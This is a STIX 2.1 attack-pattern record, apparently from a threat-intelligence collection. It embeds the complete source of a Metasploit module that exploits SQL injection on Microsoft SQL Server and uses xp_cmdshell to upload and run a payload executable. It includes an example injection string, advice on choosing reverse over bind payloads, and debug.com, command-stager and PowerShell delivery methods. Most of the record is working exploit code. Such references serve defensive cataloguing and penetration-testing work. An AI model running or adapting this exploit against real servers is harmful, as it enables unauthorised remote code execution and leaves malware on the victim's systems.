{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c757370-fde4-4838-ba80-0238890c2056",
    "created": "2024-08-14T16:39:53.006843Z",
    "modified": "2024-08-14T16:39:53.006847Z",
    "name": "Microsoft SQL Server Payload Execution via SQL Injection",
    "description": " This module will execute an arbitrary payload on a Microsoft SQL Server, using a SQL injection vulnerability.  Once a vulnerability is identified this module will use xp_cmdshell to upload and execute Metasploit payloads. It is necessary to specify the exact point where the SQL injection vulnerability happens. For example, given the following injection:  http://www.example.com/show.asp?id=1;exec xp_cmdshell 'dir';--&cat=electrical  you would need to set the following path: set GET_PATH /showproduct.asp?id=1;[SQLi];--&cat=foobar  In regard to the payload, unless there is a closed port in the web server you dont want to use any \"bind\" payload, specially on port 80, as you will stop reaching the vulnerable web server host. You want a \"reverse\" payload, probably to your port 80 or to any other outbound port allowed on the firewall. For privileged ports execute Metasploit msfconsole as root.  Currently, three delivery methods are supported.  First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.  A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target.  Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the payload on the target.  NOTE: This module will leave a payload executable on the target system when the attack is finished.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/mssql_payload_sqli.rb",
            "external_id": "mssql_payload_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0402"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-1209"
        },
        {
            "source_name": "reference",
            "url": "http://www.secforce.co.uk/blog/2011/01/penetration-testing-sql-injection-and-metasploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL_SQLI\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server Payload Execution via SQL Injection',\n      'Description'    => %q{\n          This module will execute an arbitrary payload on a Microsoft SQL\n        Server, using a SQL injection vulnerability.\n\n        Once a vulnerability is identified this module\n        will use xp_cmdshell to upload and execute Metasploit payloads.\n        It is necessary to specify the exact point where the SQL injection\n        vulnerability happens. For example, given the following injection:\n\n        http://www.example.com/show.asp?id=1;exec xp_cmdshell 'dir';--&cat=electrical\n\n        you would need to set the following path:\n        set GET_PATH /showproduct.asp?id=1;[SQLi];--&cat=foobar\n\n        In regard to the payload, unless there is a closed port in the web server,\n        you dont want to use any \"bind\" payload, specially on port 80, as you will\n        stop reaching the vulnerable web server host. You want a \"reverse\" payload, probably to\n        your port 80 or to any other outbound port allowed on the firewall.\n        For privileged ports execute Metasploit msfconsole as root.\n\n        Currently, three delivery methods are supported.\n\n        First, the original method uses Windows 'debug.com'. File size restrictions are\n        avoided by incorporating the debug bypass method presented by SecureStat at\n        Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems.\n\n        A second method takes advantage of the Command Stager subsystem. This allows using\n        various techniques, such as using a TFTP server, to send the executable. By default\n        the Command Stager uses 'wcsript.exe' to generate the executable on the target.\n\n        Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the\n        payload on the target.\n\n        NOTE: This module will leave a payload executable on the target system when the\n        attack is finished.\n\n      },\n      'Author'         =>\n        [\n          'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>',  # original module, debug.exe method, powershell method\n          'jduck',  # command stager mods\n          'Rodrigo Marcos' # SQL injection mods\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # 'sa' password in logs\n          [ 'CVE', '2000-0402' ],\n          [ 'OSVDB', '557' ],\n          [ 'BID', '1281' ],\n\n          # blank default 'sa' password\n          [ 'CVE', '2000-1209' ],\n          [ 'OSVDB', '15757' ],\n          [ 'BID', '4797' ],\n\n          # code and comments\n          [ 'URL', 'http://www.secforce.co.uk/blog/2011/01/penetration-testing-sql-injection-and-metasploit/' ]\n\n        ],\n      'Platform'       => 'win',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Payload'        =>\n        {\n          'BadChars' \t=> \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\\\$\\%\",\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2000-05-30'\n      ))\n    register_options(\n      [\n        OptEnum.new('DELIVERY', [true, 'Payload delivery method', 'OLD', ['PS', 'CMD', 'OLD']])\n      ])\n  end\n\n  # This is method required for the CmdStager to work...\n  def execute_command(cmd, opts)\n    mssql_xpcmdshell(cmd, datastore['VERBOSE'])\n  end\n\n  def exploit\n\n    method = datastore['DELIVERY'].downcase\n\n    if (method =~ /^cmd/)\n      execute_cmdstager({ :linemax => 1500, :nodelete => true })\n      #execute_cmdstager({ :linemax => 1500 })\n    else\n      # Generate the EXE, this is the same no matter what delivery mechanism we use\n      exe = generate_payload_exe\n\n      # Use powershell method for payload delivery if specified\n      if (method =~ /^ps/) or (method =~ /^power/)\n        powershell_upload_exec(exe)\n      else\n        # Otherwise, fall back to the old way..\n        mssql_upload_exec(exe, datastore['VERBOSE'])\n      end\n    end\n    print_status(\"Almost there, the stager takes a while to execute. Waiting 50 seconds...\")\n    select(nil,nil,nil,50)\n    handler\n    disconnect\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2000-05-30",
    "x_mitre_platforms": [
        "win'"
    ]
}